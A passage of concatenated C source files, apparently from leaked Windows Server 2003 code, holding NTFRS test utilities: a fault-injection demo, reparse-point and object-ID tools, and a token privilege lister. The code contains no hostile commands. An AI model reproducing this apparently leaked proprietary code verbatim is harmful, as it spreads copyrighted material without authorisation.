    if (pszCanonicalizedName) {
        *pszCanonicalizedName = NULL;
    }

    cchFull = GetFullPathNameW(pszPathName, 0, NULL, NULL);
    if (!cchFull) {
        printf("GetFullPathName() failed: %u\n", GetLastError());
        return FALSE;
    }
    pszFull = (PWCHAR) malloc(cchFull * sizeof(WCHAR));
    if (!pszFull) {
        printf("Out of memory\n");
        return FALSE;
    }
    cchFullNew = GetFullPathNameW(pszPathName, cchFull, pszFull, &pszFinal);
    if (!cchFullNew) {
        printf("GetFullPathName() failed: %u\n", GetLastError());
        return FALSE;
    }
    // Cannot use New + 1 != Old because .. is not properly accounted for.
    // Therefore, we use New > Old...sigh...
    if (cchFullNew > cchFull) {
        printf("Unexpected size from GetFullPathName()\n");
        return FALSE;
    }
    //printf("Full Directory: \"%S\"\n", pszFull);
    //printf("Final: \"%S\"\n", pszFinal);
    
    if (pszCanonicalizedName) {
        *pszCanonicalizedName = pszFull;
        return TRUE;
    } else {
        free(pszFull);
        return FALSE;
    }
}
=== C:/Users/treeman/Desktop/windows nt source code\Source\Win2K3\NT\ds\netapi\svcimgs\ntrepl\test\mifault\test\hello\src\hello.c ===
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <assert.h>
#include "hello.h"
#include "../../util/util.h"

void
P1(
    IN int i
    )
{
    printf("P1 = %d\n", i);
}

void
P2(
    IN int i
    )
{
    printf("P2 = %d\n", i);
}

void
P3(
    IN int i
    )
{
    printf("P3 = %d\n", i);
}

HANDLE
OpenFileForReadW(
    IN PWCHAR pszFileName
    )
{
    // SWORD_MARK_NEXT_SEMI(DISK, CreateFileW)
    return CreateFileW(pszFileName, GENERIC_READ, FILE_SHARE_READ,
                       NULL, OPEN_EXISTING, 0, NULL);
}

// NOTE: static functions cannot be intercepted!
static
void
usage(
    wchar_t* progname
    )
{
    printf("Usage: %S filename [iterations]\n", progname);
}

int
__cdecl
real_main(
    int argc,
    wchar_t* argv[]
    )
{
    HANDLE h = 0;
    PWCHAR filename = 0;
    int i;
    int n;
    DWORD RetStatus = ERROR_SUCCESS;

    if (argc < 2 || argc > 3) {
        // NOTE: Marking static stuff appears to generate improper code...
        //-SWORD_MARK_NEXT_SEMI(USAGE, usage)
        usage(argv[0]);
        return 1;
    }

    P1(1);
    P2(1);
    P3(1);

    n = (argc == 2) ? 1 : _wtoi(argv[2]);

    if (n != 1) {
        printf("Number of Iterations = %d\n", n);
    }
    for (i = 1; i <= n; i++) {
        filename = argv[1];

        // SWORD_MARK_NEXT_SEMI(OPEN, OpenFileForReadW)
        h = OpenFileForReadW(filename);
        if (h == NULL || h == INVALID_HANDLE_VALUE) {
            DWORD WStatus = GetLastError();
            printf("[%d] - Could not open \"%S\" (error %u)\n", i, filename, WStatus);
            continue;
            RetStatus = WStatus;
        }

        printf("[%d] - Opened file: \"%S\"\n", i, filename);
        if (CanonicalizePathName(filename, &filename)) {
            printf("[%d] - Full name: \"%S\"\n", i, filename);
            free(filename);
        }
        assert(CloseHandle(h) == TRUE);
    }

    return 0;
}

int Bar();

int
__cdecl
wmain(
    int argc,
    wchar_t* argv[]
    )
{
    printf("Bar() = %d\n", Bar());
    return real_main(argc, argv);
}
=== C:/Users/treeman/Desktop/windows nt source code\Source\Win2K3\NT\ds\netapi\svcimgs\ntrepl\test\mifault\test\hello\src\test.cpp ===
#define OUT

int rb(int a, int b)
{
    return a + b;
}

#if 0
void Test(OUT void*& out_ptr)
{
    out_ptr = rb;
}

extern "C" int Bar()
{
    typedef int (__cdecl * FP_test)(int, int);
    FP_test bar = 0;
    Test(OUT (void*&)bar);
    return bar(1, 2);
}

#else

void Test(OUT void** out_ptr)
{
    *out_ptr = rb;
}

extern "C" int Bar()
{
    typedef int (__cdecl * FP_test)(int, int);
    FP_test bar = 0;
    Test(OUT (void**)&bar);
    return bar(1, 2);
}
#endif
=== C:/Users/treeman/Desktop/windows nt source code\Source\Win2K3\NT\ds\netapi\svcimgs\ntrepl\test\mifault\test\util\util.h ===
BOOL
IsSeparator(
    IN WCHAR ch
    );

BOOL
IsUNC(
    IN PWCHAR pszPath
    );

BOOL
IsRoot(
    IN PWCHAR pszPath
    );

BOOL
IsDrive(
    IN PWCHAR pszPath
    );

BOOL
CanonicalizePathName(
    IN PWCHAR pszPathName,
    OUT PWCHAR* pszCanonicalizedName
    );
=== C:/Users/treeman/Desktop/windows nt source code\Source\Win2K3\NT\ds\netapi\svcimgs\ntrepl\test\reparsepoint\reparse.c ===
#include <stdio.h>
#include <stdlib.h>              //  exit
#include <io.h>                  //  _get_osfhandle
#include <nt.h>
#include <ntrtl.h>
#include <nturtl.h>
#include <ntioapi.h>
#include <windef.h>
#include <winbase.h>


VOID
PrintError(
    DWORD Error
    )
{
    LPVOID lpMsgBuf = NULL;

    FormatMessage( 
	FORMAT_MESSAGE_ALLOCATE_BUFFER | 
	FORMAT_MESSAGE_FROM_SYSTEM | 
	FORMAT_MESSAGE_IGNORE_INSERTS,
	NULL,
	Error,
	MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), // Default language
	(LPTSTR) &lpMsgBuf,
	0,
	NULL 
	);

    printf("%ws\n",lpMsgBuf);

    LocalFree( lpMsgBuf );

}

VOID
Usage(
    PCHAR AppName,
    DWORD ExitStatus
    )
/*++
Routine Description:
    Print usage and exit

Arguments:
    ExitStatus  - exits with this status

Return Value:
    Exit(ExitStatus)
--*/
{
    printf("%s create <filename> <reparse tag value in hex> <reparse point value in quotes>\n", 
	   AppName);
    printf("\n");
    printf("%s read <filename>\n", AppName);
    printf("\n");
    printf("%s delete <filename>\n", AppName);
    printf("\n");

    exit(ExitStatus);
}

VOID
DeleteReparsePoint(
    IN DWORD argc,
    IN PCHAR *argv
    )
{
    HANDLE File = INVALID_HANDLE_VALUE;
    PREPARSE_GUID_DATA_BUFFER ReparsePointData = NULL;
    DWORD BytesReturned = 0;
    CHAR *Data = NULL;
    REPARSE_GUID_DATA_BUFFER Header;
    DWORD WStatus = ERROR_SUCCESS;

    ReparsePointData = malloc(MAXIMUM_REPARSE_DATA_BUFFER_SIZE);

    if(!ReparsePointData) {
	printf("Out of memory.\n");
	exit(1);
    }

    File = CreateFileA(argv[2],
		      MAXIMUM_ALLOWED,
		      0,
		      NULL,
		      OPEN_EXISTING,
		      FILE_FLAG_OPEN_REPARSE_POINT | FILE_FLAG_BACKUP_SEMANTICS ,
		      NULL
		      );

    if(File == INVALID_HANDLE_VALUE) {
	WStatus = GetLastError();
	printf("Error opening file %s: %d\n", argv[2], WStatus);
	PrintError(WStatus);
	free(ReparsePointData);
	exit(1);
    }

    if(!DeviceIoControl(File,
			FSCTL_GET_REPARSE_POINT,
			NULL,
			0,
			ReparsePointData,
			MAXIMUM_REPARSE_DATA_BUFFER_SIZE,
			&BytesReturned,
			NULL
			)) {
	WStatus = GetLastError();
	printf("Error reading reparse point data: %d\n", WStatus);
	PrintError(WStatus);
	CloseHandle(File);       
	free(ReparsePointData);
	exit(1);
    }

    Header.ReparseGuid = ReparsePointData->ReparseGuid;
    Header.ReparseTag = ReparsePointData->ReparseTag;
    Header.ReparseDataLength = 0;

    if(!DeviceIoControl(File,
			FSCTL_DELETE_REPARSE_POINT,
			&Header,
			REPARSE_GUID_DATA_BUFFER_HEADER_SIZE,
			NULL,
			0,
			&BytesReturned,
			NULL
			)) {
	WStatus = GetLastError();
	printf("Error deleting reparse point data: %d\n", WStatus);
	PrintError(WStatus);
	CloseHandle(File);
	free(ReparsePointData);
	exit(1);
    }


    CloseHandle(File);
/*
    if(!DeleteFileA(argv[2])){
	WStatus = GetLastError();
	printf("Error deleting file %s: %d\n", argv[2], WStatus);
	PrintError(WStatus);
	CloseHandle(File);
	free(ReparsePointData);
	exit(1);
    }
*/ 
    free(ReparsePointData);
}

VOID
ReadReparsePoint(
    IN DWORD argc,
    IN PCHAR *argv
    )
{
    HANDLE File = INVALID_HANDLE_VALUE;
    PREPARSE_GUID_DATA_BUFFER ReparsePointData = NULL;
    DWORD BytesReturned = 0;
    CHAR *Data = NULL;
    DWORD WStatus = ERROR_SUCCESS;

    ReparsePointData = malloc(MAXIMUM_REPARSE_DATA_BUFFER_SIZE);

    if(!ReparsePointData) {
	printf("Out of memory.\n");
	exit(1);
    }

    File = CreateFileA(argv[2],
		      MAXIMUM_ALLOWED,
		      0,
		      NULL,
		      OPEN_EXISTING,
		      FILE_FLAG_OPEN_REPARSE_POINT | FILE_FLAG_BACKUP_SEMANTICS ,
		      NULL
		      );

    if(File == INVALID_HANDLE_VALUE) {
	WStatus = GetLastError();
	printf("Error opening file %s: %d\n", argv[2], WStatus);
	PrintError(WStatus);
	exit(1);
    }

    if(!DeviceIoControl(File,
			FSCTL_GET_REPARSE_POINT,
			NULL,
			0,
			ReparsePointData,
			MAXIMUM_REPARSE_DATA_BUFFER_SIZE,
			&BytesReturned,
			NULL
			)) {
	WStatus = GetLastError();
	printf("Error reading reparse point data: %d\n", WStatus);
	PrintError(WStatus);
	CloseHandle(File);
	exit(1);
    }

    CloseHandle(File);

    printf("Reparse tag = 0x%08x\n", ReparsePointData->ReparseTag);
    Data = (CHAR *)&(ReparsePointData->GenericReparseBuffer.DataBuffer);
    Data[ReparsePointData->ReparseDataLength] = '\0';
    printf("Reparse data = \"%s\"\n", Data);
    printf("\n");

    free(ReparsePointData);

}

VOID
CreateReparsePoint(
    IN DWORD argc,
    IN PCHAR *argv
    )
{
    ULONG TagValue = 0;
    HANDLE File = INVALID_HANDLE_VALUE;
    PREPARSE_GUID_DATA_BUFFER ReparsePointData = NULL;
    DWORD BytesReturned = 0;
    USHORT DataSize = strlen(argv[4]) + sizeof(char);
    DWORD WStatus = ERROR_SUCCESS;

    sscanf(argv[3],"%x", &TagValue);

    ReparsePointData = malloc(REPARSE_GUID_DATA_BUFFER_HEADER_SIZE + DataSize);

    if(!ReparsePointData) {
	printf("Out of memory.\n");
	exit(1);
    }

    ReparsePointData->ReparseTag = TagValue;
    ReparsePointData->ReparseDataLength = DataSize;

    memcpy(&(ReparsePointData->GenericReparseBuffer.DataBuffer), argv[4], DataSize );

    File = CreateFileA(argv[2],
		       MAXIMUM_ALLOWED,
		       0,
		       NULL,
		       OPEN_ALWAYS,
		       FILE_FLAG_OPEN_REPARSE_POINT | FILE_FLAG_BACKUP_SEMANTICS ,
		       NULL
		       );

    if(File == INVALID_HANDLE_VALUE) {
	WStatus = GetLastError();
	printf("Error opening file %s: %d\n", argv[2], WStatus);
	PrintError(WStatus);
	free(ReparsePointData);
	exit(1);
    }

    if(!DeviceIoControl(File,
			FSCTL_SET_REPARSE_POINT,
			ReparsePointData,
			REPARSE_GUID_DATA_BUFFER_HEADER_SIZE + DataSize,
			NULL,
			0,
			&BytesReturned,
			NULL
			)) {
	WStatus = GetLastError();
	printf("Error setting reparse point data: %d\n", WStatus);
	PrintError(WStatus);
	CloseHandle(File);
	free(ReparsePointData);
	exit(1);
    }

    CloseHandle(File);
    free(ReparsePointData);

}


VOID _cdecl
main(
    IN DWORD argc,
    IN PCHAR *argv
    )
/*++
Routine Description:
    Process the command line.

Arguments:
    argc
    argv

Return Value:
    Exits with 0 if everything went okay. Otherwise, 1.
--*/
{

    //
    // Print usage and exit
    //
    if (argc <= 2 ) {
        Usage(argv[0], 0);
    }

    //
    // Find the subcommand
    //
    if (!strcmp(argv[1], "create") && (argc == 5)) {
        CreateReparsePoint(argc, argv);
    } else if (!strcmp(argv[1], "read") && (argc == 3)) {
	ReadReparsePoint(argc, argv);
    } else if (!strcmp(argv[1], "delete") && (argc == 3)) {
	DeleteReparsePoint(argc, argv);
    } else if (!strcmp(argv[1], "/?")) {
        Usage(argv[0], 0);
    } else {
        fprintf(stderr, "Invalid usage.\n");
	Usage(argv[0], 0);
    }
    exit(0);
}
=== C:/Users/treeman/Desktop/windows nt source code\Source\Win2K3\NT\ds\netapi\svcimgs\ntrepl\test\privs\privs.c ===
/*++

Copyright (c) 1997 Microsoft Corporation

Module Name:
    frs.c

Abstract:
    This module is a development tool. It exercises the dcpromo and poke
    APIs.

Author:
    Billy J. Fuller 12-Dec-1997

Environment
    User mode winnt

--*/

#define FREE(_x_)        { if (_x_) LocalFree(_x_); _x_ = NULL; }
#define WIN_SUCCESS(_x_) ((_x_) == ERROR_SUCCESS)

//
// Is a handle valid?
//      Some functions set the handle to NULL and some to
//      INVALID_HANDLE_VALUE (-1). This define handles both
//      cases.
//
#define HANDLE_IS_VALID(_Handle)    ((_Handle) && \
                                     ((_Handle) != INVALID_HANDLE_VALUE))

//
// NT Headers
//
#include <nt.h>
#include <ntrtl.h>
#include <nturtl.h>

//
// UNICODE or ANSI compilation
//
#include <tchar.h>

//
// Windows Headers
//
#include <windows.h>
#include <rpc.h>


//
// C-Runtime Header
//
#include <malloc.h>
#include <memory.h>
#include <process.h>
#include <signal.h>
#include <string.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include <excpt.h>
#include <conio.h>
#include <sys\types.h>
#include <errno.h>
#include <sys\stat.h>
#include <ctype.h>
#include <winsvc.h>


DWORD
UtilGetTokenInformation(
    IN HANDLE                   TokenHandle,
    IN TOKEN_INFORMATION_CLASS  TokenInformationClass,
    IN DWORD                    InitialTokenBufSize,
    OUT DWORD                   *OutTokenBufSize,
    OUT PVOID                   *OutTokenBuf
    )
/*++

Routine Description:

    Retries GetTokenInformation() with larger buffers.

Arguments:
    TokenHandle             - From OpenCurrentProcess/Thread()
    TokenInformationClass   - E.g., TokenUser
    InitialTokenBufSize     - Initial buffer size; 0 = default
    OutTokenBufSize         - Resultant returned buf size
    OutTokenBuf             - free with with FrsFree()


Return Value:

    OutTokenBufSize - Size of returned info (NOT THE BUFFER SIZE!)
    OutTokenBuf - info of type TokenInformationClass. Free with FrsFree().

--*/
{
#undef DEBSUB
#define DEBSUB "UtilGetTokenInformation:"
    DWORD               WStatus;

    *OutTokenBuf = NULL;
    *OutTokenBufSize = 0;

    //
    // Check inputs
    //
    if (!HANDLE_IS_VALID(TokenHandle)) {
        return ERROR_INVALID_PARAMETER;
    }

    if (InitialTokenBufSize == 0 ||
        InitialTokenBufSize > (1024 * 1024)) {
        InitialTokenBufSize = 1024;
    }

    //
    // Retry if buffer is too small
    //
    *OutTokenBufSize = InitialTokenBufSize;
AGAIN:
    *OutTokenBuf = LocalAlloc(LMEM_FIXED | LMEM_ZEROINIT,
                              *OutTokenBufSize);
    WStatus = ERROR_SUCCESS;
    if (!GetTokenInformation(TokenHandle,
                             TokenInformationClass,
                             *OutTokenBuf,
                             *OutTokenBufSize,
                             OutTokenBufSize)) {
        WStatus = GetLastError();
        printf("GetTokenInformation(Info %d, Size %d); WStatus %d\n",
                TokenInformationClass,
                *OutTokenBufSize,
                WStatus);
        FREE(*OutTokenBuf);
        if (WStatus == ERROR_INSUFFICIENT_BUFFER) {
            goto AGAIN;
        }
    }
    return WStatus;
}


VOID
PrintUserName(
    VOID
    )
/*++
Routine Description:
    Print our user name

Arguments:
    None.

Return Value:
    None.
--*/
{
    WCHAR   Uname[MAX_PATH + 1];
    ULONG   Unamesize = MAX_PATH + 1;

    if (GetUserName(Uname, &Unamesize)) {
        printf("User name is %ws\n", Uname);
    } else {
        printf("ERROR - Getting user name; WStatus %d\n",
               GetLastError());
    }
}


#define PRIV_BUF_LENGTH    (1024)
VOID
PrintInfo(
    )
/*++
Routine Description:
    Check if the caller is a member of Groups

Arguments:
    ServerHandle
    Groups

Return Value:
    Win32 Status
--*/
{
    DWORD               i;
    TOKEN_PRIVILEGES    *Tp;
    TOKEN_SOURCE        *Ts;
    DWORD               ComputerLen;
    WCHAR               ComputerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD               WStatus;
    DWORD               TokenBufSize;
    PVOID               TokenBuf = NULL;
    HANDLE              TokenHandle = NULL;
    HANDLE              IdHandle = NULL;
    DWORD               PrivLen;
    WCHAR               PrivName[MAX_PATH + 1];
    CHAR                SourceName[sizeof(Ts->SourceName) + 1];

    ComputerLen = MAX_COMPUTERNAME_LENGTH;
    ComputerName[0] = L'\0';
    if (!GetComputerName(ComputerName, &ComputerLen)) {
        printf("GetComputerName(); WStatus %d\n",
               GetLastError());
        return;
    }
    printf("Computer name is %ws\n", ComputerName);
    PrintUserName();

    //
    // For this process
    //
    IdHandle = GetCurrentProcess();
    if (!OpenProcessToken(IdHandle,
                          TOKEN_QUERY | TOKEN_QUERY_SOURCE,
                          &TokenHandle)) {
        WStatus = GetLastError();
        printf("Can't open process token; WStatus %d\n", WStatus);
        goto CLEANUP;
    }

    //
    // Get the Token privileges from the access token for this thread or process
    //
    WStatus = UtilGetTokenInformation(TokenHandle,
                                      TokenPrivileges,
                                      0,
                                      &TokenBufSize,
                                      &TokenBuf);
    if (!WIN_SUCCESS(WStatus)) {
        printf("UtilGetTokenInformation(TokenPrivileges); WStatus %d\n",
               WStatus);
        goto CLEANUP;
    }

    Tp = (TOKEN_PRIVILEGES *)TokenBuf;
    for (i = 0; i < Tp->PrivilegeCount; ++i) {
        PrivLen = MAX_PATH + 1;
        if (!LookupPrivilegeName(NULL,
                                 &Tp->Privileges[i].Luid,
                                 PrivName,
                                 &PrivLen)) {
            printf("lookuppriv error %d\n", GetLastError());
            exit(0);
        }
        printf("Priv %2d is %ws :%s:%s:%s:\n",
               i,
               PrivName,
               (Tp->Privileges[i].Attributes &  SE_PRIVILEGE_ENABLED_BY_DEFAULT) ? "Enabled by default" : "",
               (Tp->Privileges[i].Attributes &  SE_PRIVILEGE_ENABLED) ? "Enabled" : "",
               (Tp->Privileges[i].Attributes &  SE_PRIVILEGE_USED_FOR_ACCESS) ? "Used" : "");
    }
    FREE(TokenBuf);

    //
    // Source
    //
    //
    // Get the Token privileges from the access token for this thread or process
    //
    WStatus = UtilGetTokenInformation(TokenHandle,
                                      TokenSource,
                                      0,
                                      &TokenBufSize,
                                      &TokenBuf);
    if (!WIN_SUCCESS(WStatus)) {
        printf("UtilGetTokenInformation(TokenSource); WStatus %d\n",
               WStatus);
        goto CLEANUP;
    }
    Ts = (TOKEN_SOURCE *)TokenBuf;
    CopyMemory(SourceName, Ts->SourceName, sizeof(Ts->SourceName));
    SourceName[sizeof(Ts->SourceName)] = '\0';
    printf("Source: %s\n", SourceName);
    FREE(TokenBuf);

CLEANUP:
    if (HANDLE_IS_VALID(TokenHandle)) {
        CloseHandle(TokenHandle);
    }
    if (HANDLE_IS_VALID(IdHandle)) {
        CloseHandle(IdHandle);
    }
    FREE(TokenBuf);
}


VOID _cdecl
main(
    IN DWORD argc,
    IN PCHAR *argv
    )
/*++
Routine Description:
    Process the command line.

Arguments:
    argc
    argv

Return Value:
    Exits with 0 if everything went okay. Otherwise, 1.
--*/
{
    PrintInfo();
}
=== C:/Users/treeman/Desktop/windows nt source code\Source\Win2K3\NT\ds\netapi\svcimgs\ntrepl\test\setoid\setoid.c ===
// setoid.c
// based on code from \nt\base\fs\ntfs\tests\objectid\setoid.
//


#include <stdio.h>
#include <string.h>
#include <nt.h>
#include <ntrtl.h>
#include <nturtl.h>
#include <windows.h>

#include <ntioapi.h>

#define ID_OPTIONS          (FILE_OPEN_FOR_BACKUP_INTENT     | \
                             FILE_SEQUENTIAL_ONLY            | \
                             FILE_OPEN_NO_RECALL             | \
                             FILE_OPEN_REPARSE_POINT         | \
                             FILE_OPEN_BY_FILE_ID)




int
FsTestDeleteOid(
    IN HANDLE File
    )
{
    IO_STATUS_BLOCK IoStatusBlock;
    NTSTATUS Status;

    Status = NtFsControlFile( File,                     // file handle
                              NULL,                     // event
                              NULL,                     // apc routine
                              NULL,                     // apc context
                              &IoStatusBlock,           // iosb
                              FSCTL_DELETE_OBJECT_ID,   // FsControlCode
                              NULL,                     // input buffer
                              0,                        // input buffer length
                              NULL,                     // OutputBuffer for data from the FS
                              0                         // OutputBuffer Length
                             );

    if (!NT_SUCCESS(Status)) {
        printf( "Error deleting OID.  Status: %x\n", Status );
    }
    return Status;
}


int
FsTestGetOid(
    IN HANDLE hFile,
    IN FILE_OBJECTID_BUFFER *ObjectIdBuffer
    )
{
    IO_STATUS_BLOCK IoStatusBlock;
    NTSTATUS Status;

    Status = NtFsControlFile( hFile,                           // file handle
                              NULL,                            // event
                              NULL,                            // apc routine
                              NULL,                            // apc context
                              &IoStatusBlock,                  // iosb
                              FSCTL_GET_OBJECT_ID,             // FsControlCode
                              &hFile,                          // input buffer
                              sizeof(HANDLE),                  // input buffer length
                              ObjectIdBuffer,                  // OutputBuffer for data from the FS
                              sizeof(FILE_OBJECTID_BUFFER) );  // OutputBuffer Length

    if (Status == STATUS_SUCCESS) {

        printf( "\nOid for this file is %s", ObjectIdBuffer->ObjectId );

        //FsTestHexDump( ObjectIdBuffer->ObjectId, 16 );

        printf( "\nObjectId:%08x %08x %08x %08x\n",
                *((PULONG)&ObjectIdBuffer->ObjectId[12]),
                *((PULONG)&ObjectIdBuffer->ObjectId[8]),
                *((PULONG)&ObjectIdBuffer->ObjectId[4]),
                *((PULONG)&ObjectIdBuffer->ObjectId[0]) );

        printf( "\nExtended info is %s\n", ObjectIdBuffer->ExtendedInfo );

        //FsTestHexDump( ObjectIdBuffer->ExtendedInfo, 48 );
    }

    return Status;
}



int
FsTestSetOid(
    IN HANDLE hFile,
    IN FILE_OBJECTID_BUFFER ObjectIdBuffer
    )
{

    IO_STATUS_BLOCK IoStatusBlock;
    NTSTATUS Status;

    Status = NtFsControlFile( hFile,                    // file handle
                              NULL,                     // event
                              NULL,                     // apc routine
                              NULL,                     // apc context
                              &IoStatusBlock,           // iosb
                              FSCTL_SET_OBJECT_ID,      // FsControlCode
                              &ObjectIdBuffer,          // input buffer
                              sizeof(ObjectIdBuffer),   // input buffer length
                              NULL,                     // OutputBuffer for data from the FS
                              0                         // OutputBuffer Length
                             );


    if (!NT_SUCCESS(Status)) {
        printf( "Error setting OID.  Status: %x\n", Status );
    }
    return Status;
}

//
//  Build with USE_RELATIVE_OPEN set to one to use relative opens for
//  object IDs.  Build with USE_RELATIVE_OPEN set to zero to use a device
//  path open for object IDs.
//  Opens by File ID always use a relative open.
//

#define USE_RELATIVE_OPEN 1

#define VOLUME_PATH  L"\\\\.\\H:"
#define VOLUME_DRIVE_LETTER_INDEX 4
#define FULL_PATH    L"\\??\\H:\\1234567890123456"
#define FULL_DRIVE_LETTER_INDEX 4
#define DEVICE_PREFIX_LEN 14


HANDLE
FsTestOpenRelativeToVolume (
    IN PWCHAR ArgFile,          //  no device prefix for relative open.
    IN PWCHAR DriveLetter,
    IN PWCHAR ArgFullFile       // Full file name.
    )
{
    HANDLE File;
    IO_STATUS_BLOCK IoStatusBlock;
    NTSTATUS Status;
    NTSTATUS GetNameStatus;
    NTSTATUS CloseStatus;
    OBJECT_ATTRIBUTES ObjectAttributes;
    UNICODE_STRING str;
    WCHAR mybuffer[32768];
    PFILE_NAME_INFORMATION FileName;
    HANDLE VolumeHandle;
    DWORD WStatus;
    WCHAR Volume[] = VOLUME_PATH;    // Arrays of WCHAR's aren't constants

    FILE_OBJECTID_BUFFER ObjectIdBuffer;
    NTSTATUS GetFrsStatus;
    FILE_INTERNAL_INFORMATION InternalInfo;

    File = CreateFileW( ArgFullFile,
                        FILE_READ_ATTRIBUTES,
                        FILE_SHARE_READ | FILE_SHARE_WRITE,
                        NULL,
                        OPEN_EXISTING,
                        FILE_FLAG_BACKUP_SEMANTICS,
                        NULL );

    if ( File == INVALID_HANDLE_VALUE ) {
        printf( "Error opening file '%ws'   %x\n", ArgFullFile, GetLastError() );
        return INVALID_HANDLE_VALUE;
    }

    //
    // Get the File ID.
    //
    GetFrsStatus = NtQueryInformationFile( File,
                                           &IoStatusBlock,
                                           &InternalInfo,
                                           sizeof(InternalInfo),
                                           FileInternalInformation );

    if (!NT_SUCCESS( GetFrsStatus )) {
        printf( "Get File ID failed: 0x%08x \n", GetFrsStatus );
        NtClose( File );
        return INVALID_HANDLE_VALUE;
    } else {
        printf( "FID is: (highpart lowpart) %08x %08x\n",
                InternalInfo.IndexNumber.HighPart, InternalInfo.IndexNumber.LowPart );
    }

    CloseHandle( File );

    //
    //  Open the volume for relative opens.
    //
    RtlCopyMemory( &Volume[VOLUME_DRIVE_LETTER_INDEX], DriveLetter, sizeof(WCHAR) );
    printf( "\nOpening volume handle (%ws)\n", Volume );
    VolumeHandle = CreateFileW( (PUSHORT) &Volume,
                                GENERIC_READ | GENERIC_WRITE,
                                FILE_SHARE_READ | FILE_SHARE_WRITE,
                                NULL,
                                OPEN_EXISTING,
                                0,
                                NULL );

    if (VolumeHandle == INVALID_HANDLE_VALUE) {
        WStatus = GetLastError();
        printf( "Unable to open %ws volume\n", &Volume );
        printf( "Error from CreateFile: %d", WStatus );
        return INVALID_HANDLE_VALUE;
    }

    //
    // Open the file by ID.
    //
    str.Length = 8;
    str.MaximumLength = 8;
    str.Buffer = (PWCHAR) &InternalInfo.IndexNumber.QuadPart;

    InitializeObjectAttributes( &ObjectAttributes,
                                &str,
                                OBJ_CASE_INSENSITIVE,
                                VolumeHandle,
                                NULL );
    Status = NtCreateFile( &File,
                           GENERIC_WRITE,
                           &ObjectAttributes,
                           &IoStatusBlock,
                           NULL,                  // AllocationSize
                           FILE_ATTRIBUTE_NORMAL,
                           FILE_SHARE_READ | FILE_SHARE_WRITE,
                           FILE_OPEN,
                           ID_OPTIONS,
                           NULL,                  // EaBuffer
                           0 );

    if (NT_SUCCESS( Status )) {

        FileName = (PFILE_NAME_INFORMATION) &mybuffer[0];
        FileName->FileNameLength = sizeof(mybuffer) - sizeof(ULONG);

        GetNameStatus = NtQueryInformationFile( File,
                                                &IoStatusBlock,
                                                FileName,
                                                sizeof(mybuffer),
                                                FileNameInformation );

        if (!NT_SUCCESS( GetNameStatus )) {
            printf( "\nGetNameStatus failed: 0x%08x \n", GetNameStatus );
            NtClose( File );
            File = INVALID_HANDLE_VALUE;
        } else {
            printf( "File name is: %ws\n", FileName->FileName );
        }

    } else {
        printf( "Error opening file by FID - 0x%08x\n", Status );
        File = INVALID_HANDLE_VALUE;
    }

    if (VolumeHandle != NULL) {
        CloseHandle( VolumeHandle );
    }

    return File;
}




NTSTATUS
SetupOnePrivilege (
    ULONG Privilege,
    PUCHAR PrivilegeName
    )
{

    BOOLEAN PreviousPrivilegeState;
    NTSTATUS Status;

    Status = RtlAdjustPrivilege(Privilege, TRUE, FALSE, &PreviousPrivilegeState);

    if (!NT_SUCCESS(Status)) {
        printf("Your login does not have `%s' privilege.\n", PrivilegeName);

        if (Status != STATUS_PRIVILEGE_NOT_HELD) {
            printf("RtlAdjustPrivilege failed : 0x%08x\n", Status);
        }
        printf("Update your: User Manager -> Policies -> User Rights.\n");
        return Status;

    }

    printf("Added `%s' privilege (previous: %s)\n",
           PrivilegeName, (PreviousPrivilegeState ? "Enabled" : "Disabled"));

    return Status;
}




VOID
StrToGuid(
    IN PCHAR  s,
    OUT GUID  *pGuid
    )
/*++

Routine Description:

    Convert a string in GUID display format to an object ID that
    can be used to lookup a file.

    based on a routine by Mac McLain

Arguments:

    pGuid - ptr to the GUID.

    s - The input character buffer in display guid format.
        e.g.:  b81b486b-c338-11d0-ba4f0000f80007df

        Must be at least GUID_CHAR_LEN (35 bytes) long.

Function Return Value:

    None.

--*/
{

    if (pGuid != NULL) {

        sscanf( s, "%08lx-%04x-%04x-%02x%02x%02x%02x%02x%02x%02x%02x",
                &pGuid->Data1,
                &pGuid->Data2,
                &pGuid->Data3,
                &pGuid->Data4[0],
                &pGuid->Data4[1],
                &pGuid->Data4[2],
                &pGuid->Data4[3],
                &pGuid->Data4[4],
                &pGuid->Data4[5],
                &pGuid->Data4[6],
                &pGuid->Data4[7] );
    } else {

        sprintf( s, "<ptr-null>" );
    }
}

#if 0
VOID
FsTestObOidHelp(
    char *ExeName
    )
{

    printf( "This program opens a file by its file id or object id (ntfs only).\n\n" );
    printf( "usage: %s x: [FileID | Raw ObjectId | Guid Display Format ObjectID]\n", ExeName );

    printf( "Where x: is the drive letter\n" );

    printf( "A FileID is a string of 16 hex digits with a space between each\n"
            "group of 8.  E.G. oboid 00010000 00000024\n\n" );

    printf( "A raw object ID is a string of 32 hex digits with a space\n"
            "between each group of 8\n"
            "E.G. ObjectId:df0700f8 00004fba 11d0c338 b81b485f\n\n" );

    printf( "A GUID display format object ID is a string of the form \n"
            "b81b486b-c338-11d0-ba4f0000f80007df\n"
            "See the struct def for GUID in sdk\\inc\\winnt.h for byte layout.\n" );
}



VOID
_cdecl
main(
    int argc,
    char *argv[]
    )
{
    ULONG ObjectId[4];
    ULONG Length;
    WCHAR Drive;

    //
    //  Get parameters.
    //

    if (argc < 3) {

        FsTestObOidHelp( argv[0] );
        return;
    }

    RtlZeroBytes( ObjectId,
                  sizeof( ObjectId ) );

    Length = strlen( argv[2] );

    if ((argc == 3) && (Length == 35) && (argv[2][8] == '-')) {

        StrToGuid( argv[2], (GUID *)ObjectId );
        printf( "\nUsing ObjectId: %08x %08x %08x %08x\n",
                ObjectId[3], ObjectId[2], ObjectId[1], ObjectId[0] );
        Length = 32;

    } else if (argc == 6) {

        sscanf( argv[2], "%08x", &ObjectId[3] );
        sscanf( argv[3], "%08x", &ObjectId[2] );
        sscanf( argv[4], "%08x", &ObjectId[1] );
        sscanf( argv[5], "%08x", &ObjectId[0] );
        printf( "\nUsing ObjectId: %08x %08x %08x %08x\n",
                ObjectId[3], ObjectId[2], ObjectId[1], ObjectId[0] );
        Length = 32;

    } else if (argc == 4) {

        sscanf( argv[2], "%08x", &ObjectId[1] );
        sscanf( argv[3], "%08x", &ObjectId[0] );
        printf( "\nUsing FileId: %08x %08x\n", ObjectId[1], ObjectId[0] );
        Length = 16;

    } else {

        printf("Arg (%s) invalid format.\n\n", argv[2]);
